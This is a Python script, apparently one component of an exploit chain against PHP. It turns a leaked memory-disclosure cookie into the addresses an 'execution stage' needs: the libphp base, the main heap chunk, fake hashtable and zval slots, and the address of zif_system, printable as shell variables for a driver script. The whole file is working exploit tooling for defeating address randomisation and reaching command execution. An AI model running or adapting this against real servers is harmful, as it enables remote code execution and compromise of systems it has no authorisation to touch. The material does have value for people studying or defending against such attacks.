#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""leak_addrs.py - turn a disclosure cookie into the addresses the execution stage needs.

The leak is only useful if it yields a complete address set, so this is deliberately a separate step
from decoding: it applies the two relations we measured (main chunk = disclosed chunk + 0x400000, and
each symbol offset inside libphp) and prints them either for a human or as shell assignments for the
driving script.

usage:
  leak_addrs.py --cookie-file /tmp/ck.txt                 # human readable
  eval "$(leak_addrs.py --cookie-file /tmp/ck.txt --emit shell)"
"""
import argparse
import sys

from decode_leak_cookie import DEFAULT_SYMBOLS, load_cookie, slide_pointers, summarise, to_bytes

MAIN_DELTA = 0x400000   # measured: main chunk sits 4 MiB above the chunk the stale id lives in
S_OFF = 0xF8398         # fake zend_array slot inside the main chunk (reference layout)
HSV_OFF = 0x7D720       # the zval slot the fake reference must overwrite (reference layout)


def parse_symbols(items):
    symbols = dict(DEFAULT_SYMBOLS)
    for item in items:
        name, _, offset = item.partition("=")
        symbols[name.strip()] = int(offset.strip(), 0)
    return symbols


def main(argv=None):
    ap = argparse.ArgumentParser(description="address set for the execution stage")
    source = ap.add_mutually_exclusive_group(required=True)
    source.add_argument("--value")
    source.add_argument("--cookie-file")
    source.add_argument("--dump")
    ap.add_argument("--symbol", action="append", default=[],
                    help="name=offset inside libphp, e.g. zif_system=0x42cd70")
    ap.add_argument("--main-delta", type=lambda x: int(x, 0), default=MAIN_DELTA)
    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=S_OFF)
    ap.add_argument("--hsv-off", type=lambda x: int(x, 0), default=HSV_OFF)
    ap.add_argument("--min-cluster", type=int, default=16,
                    help="pointers a fingerprint cluster needs before it counts as a load base")
    ap.add_argument("--emit", choices=["text", "shell"], default="text")
    args = ap.parse_args(argv)

    symbols = parse_symbols(args.symbol)
    blob = to_bytes(load_cookie(args))
    result = summarise(blob, symbols)

    libphp = result["libphp_base"]
    if not libphp or result["libphp_weight"] < args.min_cluster:
        print("incomplete: no libphp base (%d pointers in the best cluster)"
              % result["libphp_weight"], file=sys.stderr)
        return 1
    disclosed = result["chunk_base"]
    if not disclosed:
        print("incomplete: no chunk cluster", file=sys.stderr)
        return 1
    main_chunk = disclosed + args.main_delta

    values = {
        "LIBPHP": libphp,
        "CHUNK": disclosed,
        "MAIN": main_chunk,
        "S": main_chunk + args.s_off,
        "HSV": main_chunk + args.hsv_off,
    }
    for name in ("zif_system", "zend_hash_destroy", "zval_ptr_dtor"):
        if name in symbols:
            values[name.upper()] = libphp + symbols[name]

    if args.emit == "shell":
        for name, value in values.items():
            print("%s=%#x" % (name, value))
        return 0

    print("decoded       : %d bytes, %d pointer windows" % (result["decoded_bytes"], result["pointer_windows"]))
    print("disclosed     : %#x   (%d pointers, %d%% of the window)"
          % (disclosed, result["chunk_base_votes"], round(100 * result["chunk_base_share"])))
    print("libphp        : %#x   (%d pointers in the fingerprint cluster)"
          % (libphp, result["libphp_weight"]))
    print("main chunk    : %#x   (= disclosed + %#x, measured relation)"
          % (main_chunk, args.main_delta))
    print("S  (fake ht)  : %#x   (main + %#x)" % (values["S"], args.s_off))
    print("hsv (fake ref): %#x   (main + %#x)" % (values["HSV"], args.hsv_off))
    for name in ("ZIF_SYSTEM", "ZEND_HASH_DESTROY"):
        if name in values:
            print("%-13s : %#x" % (name.lower().replace("_", " "), values[name]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
